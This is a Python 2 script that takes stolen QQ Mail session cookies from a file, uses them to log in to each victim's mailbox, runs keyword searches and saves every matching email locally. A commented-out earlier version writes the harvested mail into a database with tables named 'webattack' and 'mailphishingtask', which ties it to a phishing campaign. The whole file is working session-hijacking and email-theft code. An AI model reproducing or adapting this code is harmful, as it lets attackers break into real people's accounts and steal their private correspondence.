# -*- coding: gb18030 -*-
import requests
from time import sleep
from bs4 import BeautifulSoup
import os
import re
import sys
import urllib
#import pymysql

SLEEP_DELAY = 1
OUT_BASE_DIR = 'out'

with open('keyword.txt', 'r') as f:
  keywords = f.readlines()

s = requests.session()
def do_get(url, param=None, cookie=None):
  sleep(1) #TODO need to modify to random sleep
  header = {'Referer': 'https://mail.qq.com/',
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0'}
  if cookie:
    header['Cookie'] = cookie
            
  response = s.get(url, headers=header,  params=param, timeout=80, allow_redirects=False)
  return response

# remember_me: GET /cgi-bin/login?fun=psaread&rand=&delegate_url=&target= HTTP/1.1
# else:        GET /cgi-bin/login?vt=passport&vm=wsk&delegate_url= HTTP/1.1
def get_sid_uid(cookie, is_remember_me):
  url = 'https://mail.qq.com/cgi-bin/login'
  if (is_remember_me):
    param = 'fun=psaread&rand=&delegate_url=&target='
  else:
    param = 'vt=passport&vm=wsk&delegate_url='
  
  #print param
  #print cookie
  response = do_get(url, param, cookie)
  print "cookies:", response.cookies.values()
  if response.status_code == 302:
    m = re.search(r'\?sid=([^\"]+)\"', response.text)
    if m:
      sid = m.group(1)
      uid = sid
      for value in response.cookies.values():
        m = re.search(r'(\d+)@qq\.com', value)
        if m:
          uid = m.group(1)
      return sid, uid
  return (None, None)

#https://mail.qq.com/cgi-bin/readmail?folderid=1&folderkey=&t=readmail&mailid=ZC1807-agw_NK8x8rxFNjNvl7gNY96&mode=pre&maxage=3600&base=12.58&ver=12834&sid=Hnj0rDcL_bfMEhdK
def get_mail(mailid, sid, out_dir):
  url = "https://mail.qq.com/cgi-bin/readmail"
  param = 'folderid=1&folderkey=&t=readmail&mailid={0:s}&mode=pre&maxage=3600&base=12.58&ver=12834&sid={1:s}'.format(mailid, sid)
  print param
  response = do_get(url, param)
  name = os.path.join(out_dir, mailid + '.html')
  with open(name, 'wb') as f:
    f.write(response.text)

#<a href="/cgi-bin/mail_list?sid=FdYBxBBEOS1W5XIv&page=1&folderid=all&receiver=QQ&subject=&sender=QQ&daterange=&attach=&flagnew=&s=search&searchmode=&filetype=&advancesearch=3&combinetype=or&listmode=&stype=&ftype=&AddrID=&grpid=&category=&showattachtag=&from=&sorttype=6&sortasc=0"  name="nextpage"  page="1" id="nextpage"
def get_mails_in_page(sid, href, out_dir):
  url = "https://mail.qq.com" + href
  print url
  response = do_get(url)
#  print response.text
  if response.status_code == 200:
    soup = BeautifulSoup(response.text, 'lxml')
    #<nobr t="6" mailid="ZC1801-z6mJ6HM~j8GqPDlkv~soR99"
    for tag in soup.find_all("nobr"):
      mailid = tag.get('mailid')
      if mailid:
        get_mail(mailid, sid, out_dir)
    for tag in soup.find_all('a'):
      tagid = tag.get('id')
      if 'nextpage' == tagid:
        get_mails_in_page(sid, tag.get('href'), out_dir)
        return

#https://mail.qq.com/cgi-bin/mail_list?sid=XDoKxV61C0U-Q0Yb&s=search&folderid=all&page=0&keyword=helloworld&sender=helloworld&receiver=helloworld&topmails=0&advancesearch=3&combinetype=or&loc=frame_html,,,7
def get_mails(sid, uid):
  out_dir = os.path.join(OUT_BASE_DIR, uid)
  if os.path.exists(out_dir):
    return
  os.makedirs(out_dir)
  for line in keywords:
    word = urllib.quote(line.strip('\n'))
    href = '/cgi-bin/mail_list?sid={0:s}&s=search&folderid=all&page={1:d}&keyword={2:s}&sender={3:s}&receiver={4:s}&topmails=0&advancesearch=3&combinetype=or&loc=frame_html,,,7'.format(sid, 0, word, word, word)
    get_mails_in_page(sid, href, out_dir)

def handle_one_cookie(cookie):
  is_remember_me = False
  if ('pcache' in cookie):
    is_remember_me = True
    
  (sid, uid) = get_sid_uid(cookie, is_remember_me)
  if sid:
    get_mails(sid, uid)
  else:
    print "fail to find sid for cookie:", cookie

def handle_cookies():
  with open('cookie.txt', 'r') as f:
    for line in f:
      line = line.strip('\n')
      if line:
        handle_one_cookie(line)
      
def main():
  reload(sys)
  sys.setdefaultencoding('gb18030')
  handle_cookies()


'''
def ct_content(url,payload):
    s = requests.session()
    
    header = {\
            
            'Referer': 'https://mail.qq.com/cgi-bin/frame_html?t=newwin_frame&sid=M6EI2PkDteRzaXkj&url=/cgi-bin/readmail?folderid=1%26folderkey=1%26t=readmail%26mailid=ZC4411-kQP8LA2p7r_ALDxmjE83W82%26mode=pre%26maxage=3600%26base=12.870000000000001%26ver=36726',
            'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36',
        
            'Upgrade-Insecure-Requests':'1'}
    
    f = open('cookie.txt', 'r')
    t = f.read()
    header['cookie'] = t


    
    response = s.get(url, headers=header,  params=payload, timeout=80)
    
    
    
    html = response.text
    
    return html

def get_mailid(sid):
    ids = []
    for page in range(1):
        url = "https://mail.qq.com/cgi-bin/mail_list?"
        payload ='sid={0:s}=personal&folderkey=-3&page={0:s}&stype=myfolders&ver=333674.0&cachemod=maillist&cacheage=7200&r='.format(sid,page)
        html = ct_content(url,payload)
        soup = BeautifulSoup(html, 'lxml')
        where = soup.find_all("input")

        for i in where:
            t = str(i)

            xp = re.findall("value=\"(.*?)\"/>", t)
            if (len(str(xp)[2:-2]) == 30):
                id=str(xp)[2:-2]
                #print id
                ids.append(id)
    print len(ids)
    return ids

def get_sid():
    f = open('sid.txt', 'r')
    t = f.read()
    return t

def get_mail(mailid,sid):
    url = "https://mail.qq.com/cgi-bin/readmail?"
    payload = 'folderid=1&folderkey=1&t=readmail&mailid={0:s}&mode=pre&maxage=3600&base=12.57&ver=16137&sid={1:s}'.format(mailid, sid)
    #print payload
    html = ct_content(url, payload)
    html =  html.replace("gb18030","utf-8")
    return html
    #soup = BeautifulSoup(html, 'lxml')

def get_sub(html):
    soup = BeautifulSoup(html, 'lxml')
    where = soup.find_all("title")
    return where[0].string

def fs (key, cook):
    cook = cook.replace('ssid', '')
    kl = cook.find(key)
    fl = cook.find(";", kl)
    return cook[kl+len(key)+1:fl]

def main():
    #os.system('calc')
    reload(sys)
    sys.setdefaultencoding('utf8')
    key = sys.argv[1]
    
    conn = pymysql.connect(host='127.0.0.1', port=3306, user='root', passwd='root', db='webattack',charset='utf8')
    cursor = conn.cursor()
    global cookie
    #cookie = get_cookie()
    #print cookie



    subs = []
    sid =get_sid()
    #print sid
    mailids = get_mailid(sid)
    print len(mailids)
    mails = []

    for id in mailids:
       mail = get_mail(id,sid)
      
       mails.append(mail)
    
       sub = get_sub(mail)
       subs.append(sub)
    sql_select = "SELECT id,uid,target FROM mailphishingtask where tkey='%s' ;" % key
    cursor.execute(sql_select)

    data = cursor.fetchone()
    tid = int(data[0])
    uid = int(data[1])
    mailbox = data[2]
    addtime = int(time.time())

    for i in range(len(mailids)):
        ls = [[1], ]
        l = [mailids[i], mails[i],subs[i],tid,uid,mailbox,addtime]
        ls.append(l)
        del ls[0]
        sql = 'INSERT INTO mails (mailid,mailcontent,sub,pid,uid,mailbox,addtime) VALUES (%s,%s,%s,%s,%s,%s,%s)'
        cursor = conn.cursor()
        cursor.executemany(sql, ls)
        cursor.close()
        conn.commit()



    conn.close()
'''

if __name__ == '__main__':
    main()